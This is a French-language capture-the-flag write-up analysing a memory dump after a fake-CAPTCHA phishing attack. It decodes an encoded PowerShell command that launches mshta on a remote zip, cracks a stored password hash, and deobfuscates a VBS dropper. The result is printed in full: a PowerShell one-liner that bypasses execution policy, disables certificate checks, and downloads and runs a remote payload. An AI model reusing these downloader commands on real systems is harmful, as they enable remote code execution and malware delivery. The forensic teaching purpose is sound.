# Cyborg20 - Writeup

## Description

"Un ancien adversaire fou semble de retour pour menacer la planète !

Celui-ci a réussi à tromper la scientifique de la Capsule Corp via une technique de phishing dernier cri utilisant un faux CAPTCHA, heureusement l'antivirus a réussi à neutraliser le malware avant qu'il ne soit exécuté. Il semblerait que cet être malveillant ait réussi à trouver le mot de passe de l'utilisatrice et à s'en servir pour son méfait...

Retrouvez le malware et essayez de comprendre qui peut bien être derrière ce mauvais coup visant à éliminer les guerriers protecteurs de la planète Terre...

Format du flag : CTF{fqdn.du.domaine.malveillant}"

## Déroulé du challenge

L'énoncé du challenge décrit une technique de phishing utilisant un faux CAPTCHA. Une simple recherche sur votre moteur de recherche préféré "fake captcha phishing ioc" vous oriente sur la méthodologie de fake captcha utilisée par Lumma Stealer notamment : https://www.mcafee.com/blogs/other-blogs/mcafee-labs/behind-the-captcha-a-clever-gateway-of-malware/.

Nous recherchons donc sur l'image mémoire le mot-clé CAPTCHA afin de retrouver la commande malveillante :

```bash
[Apr 23, 2025 - 14:37:46 (CEST)] exegol-labossi /workspace # strings CAPSULE-20250305-185453.dmp | grep "CAPTCHA"
powershell.exe -eC bQBzAGgAdABhAC4AZQB4AGUAIAAiAGgAdAB0AHAAcwA6AC8ALwB0AGgAZQAtAHIAaQBnAGgAdAAtAHcAYQB5AC4AbgBlAHQALwBiAHUAdABpAG0AbgBvAHQAdABoAGUAZgBsAGEAZwAvAHYAZQByAHkAYgBhAGQAZgBpAGwAZQAuAHoAaQBwACIA #  CAPTCHA Verification
```

La commande powershell base64-encodée donne le resultat suivant lorsqu'elle est décodée :

```
mshta.exe "https://the-right-way.net/butimnottheflag/verybadfile.zip"
```

On cherche ensuite le fichier zip sur le dump mémoire et on le dump.

Une fois celui-ci dumpé on retrouve à l'intérieur deux fichiers : un script python **decoder.py** et un fichier **hahahahaha**.
Exemple du fichier hahahahaha :

```
PUBNCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETkZXCDIO\OGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAZXCDIO\EmESK▒ZXCDIO\OMO^K▒ZXCDCoVBMO^K▒ZXCDIO\OMO^K▒ZXCNCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCE\OMO^K▒ZXCDIO\OMO^K▒ZRcNDO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OGETAPRINCEVEGETAPRINCEVEGE^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^KPUCDIO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMOTkZXCDIO\OMO^K▒ZXCDIO\OMO^K▒ PRINCEVEGETA▒ZXCDIO\OMO^K▒ZXCDIO\EmESK▒ZXCDIO\OMOTAPRINCEVEGETAZXCDIO\OMO^K▒ZXCDIO\OMO^[PRINCEVEGETA^XCDIO\OMO^K▒ZXCDCoVBMO^K▒ZXCDIO\EGETAPRINCEVEGETA▒ZXCDIO\OMO^K▒ZXCDIO\O]ETAPRINCEVEGETAZXCDIO\OMO^K▒ZRcNDO\OMO^K▒ZXCDCEVEGETK▒ZXINCEVEGO^K▒ZXCDIO\OMO^K▒ZXCDI_VEGETA▒ZXCDCEVEGETK▒ZXCDIO\OMO^KPUCDIO\OMO^K▒ZRINCEVEMO^K▒PRINCE\OMO^K▒ZXCDIO\OMO^K▒ZXSNCEVEGK^K▒ZRINCEVEMO^K▒ZXCDIO\OMOTkZXCDIO\OMO^K▒ZXCDIO\OMO^K▒     PRINCEVEGETAPRINIO\OMO^K▒ZXCDIO\EmESK▒ZXCDIO\OMOTAPRINCEVEGETO▒ZXCDIO\OMO^K▒ZXCDIO\OMO^[PRINCEVEGETAZXCDIO\OMO^K▒ZXCDCoVBMO^K▒ZXCDIO\EGETAZRINCEVEGO^K▒ZXCDIO\OMO^K▒ZXCDIO\O]ETA^XBNCEVEGEZK▒ZXCDIO\OMO^K▒ZRcNDO\OMO^K▒ZXCDCEVEGETK▒PRINCEVOMO^K▒ZXCDIO\OMO^K▒ZXCDI_VEGETA▒ZRINCEVEGO^K▒ZXCDIO\OMO^KPUCDIO\OMO^K▒ZRINCEVEMO^KPRINCO\OMO^K▒ZXCDIO\OMO^K▒ZXSNCEVEGK^K▒PRINCEVOMO^K▒ZXCDIO\OMOTkZXCDIO\OMO^K▒ZXCDIO\OMO^K▒     PRINCEXOMO^KPRINCO\OMO^K▒ZXCDIO\EmESK▒ZXCDIO\OMOTAPRCDIO\OLETAPOCDIO\OMO^K▒ZXCDIO\OMO^[PRI@IO\OMOTAPRIDIO\OMO^K▒ZXCDCoVBMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^K▒ZRcNDO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^K▒ZRINCEVEGETAPRISIO\OMO^K▒ZXCDIO\OMO^K▒ZXCDIO\OMO^KPUCDIO\OMO^K▒ZXCDIO\OMO^K▒ZXCDHEVEGETAPRINCEVEGETAPRINCEVE]O^K▒ZXCDIO\OMO^K▒ZXCDIO\OMOTkZXCDIO\OMO^K▒ZXCDIO\OZETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAZXCDIO\OMO^K▒ZXCDIO\EmESK▒ZXCDIO\OMO^KPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINIO\OMO^K▒ZXCDCoVBMO^K▒ZYINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGETAPRINCEVEGO^K▒ZRcd0E.
                       RYN7
N0om!APRICXVGN▒BRDNRoVEGE:IF95
     W]
5*▒
   V
6/TPP$:8!TXXI
-<1vuI
-+To#
     AT\P
```

Si l'on lit le script python on s'apercoit que celui-ci prend un fichier et une clé en paramètre et XOR le tout.
Il faut donc retrouver la clé et jouer le script avec la clé sur le fichier bahahahaha pour obtenir le malware.

Selon l'énoncé le mot de passe de l'utilisatrice a été volé et utilisé par l'attaquant. En fouillant le dump mémoire on trouve un fichier **my_passwords.txt** contenant :

```
Here is the file where I store all my passwords ! But in a more secure way 8-)
Windows password storing way is incredible !

bulma:d0a525665f636ad789a16063d449c086
```

On casse donc le hash et on obtient le mot de passe suivant : **princevegeta123**
Puis on lance le script avec le mot de passe indiqué sur le fichier bahahahaha.

Nous obtenons donc un script VBS bien obfusqué.
Cependant si l'on regarde un peu le script on voit dans le MainProcess que peu importe le cas la fonction **Eradication** est appelée :
```vb
    Select Case finalCall
        Case 0 To 15: Call Eradication
        Case 16 To 31: Call Eradication
        Case Else: Call Eradication
    End Select
End Sub
```

La fonction **Eradication** :
```vb
Sub Eradication()
    Dim obfuscatedString, cleanString
    obfuscatedString = EarthDestruction()
    cleanString = EliminateMonkeys(obfuscatedString)
    DiseaseCombination(cleanString)
End Sub
```
Celle-ci semble récupérer une chaine de caractères (EarthDestruction) puis la passer dans une autre fonction EliminateMonkeys qui la nettoie.

La fonction **EarthDestruction** :
```vb
Function EarthDestruction()
    Dim part1, part2, part3, part4
    part1 = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZXJ"
    part2 = "2aWS0nG0kUNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1tTeXN0ZW0uTmV0LlNlcnZp"
    part3 = "Y2VQb2ludE1hbmFnZXJdOjpTZWN1cml0S0nG0kUeVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50"
    part4 = "TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbS0nG0kUmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXNS0nG0kU0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG"
    part5 = "5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvS0nG0kUd25sb2Fkc3RyaW5nKCdodHRwOi8vZ2Vyby5yZWRyaWJib24uanAvdmVyeV9iYWRfbWFsd2FyZS5leGUnKSkpKQ=="
    EarthDestruction = part1 & part2 & part3 & part4 & part5
End Function
```
On retrouve la chaine de caractères suivante :
```
U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZXJ2aWS0nG0kUNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1tTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0S0nG0kUeVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbS0nG0kUmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXNS0nG0kU0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvS0nG0kUd25sb2Fkc3RyaW5nKCdodHRwOi8vZ2Vyby5yZWRyaWJib24uanAvdmVyeV9iYWRfbWFsd2FyZS5leGUnKSkpKQ==
```

Cependant celle-ci ne semble pas donner quelque chose d'interessant telle quelle.


La fonction **EliminateMonkeys** :
```vb
Function EliminateMonkeys(inputStr)
    Dim patternHex, patternStr
    patternHex = Array(&H53, &H30, &H6E, &H47, &H30, &H6B, &H55)
    For Each charCode In patternHex
        patternStr = patternStr & Chr(charCode)
    Next
    EliminateMonkeys = Replace(inputStr, patternStr, "")
End Function
```

Cette fonction semble reconstituer la chaine "S0nG0kU" et la remplacer par rien dans une chaine de caractère donnée en entrée. Si on l'applique sur la chaine précédente et qu'on décode on retrouve la chaine suivante :

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('http://gero.redribbon.jp/very_bad_malware.exe'))))
```

Cela correspond à un payload powershell et nous permet de retrouver le flag : **LABO{gero.redribbon.jp}**
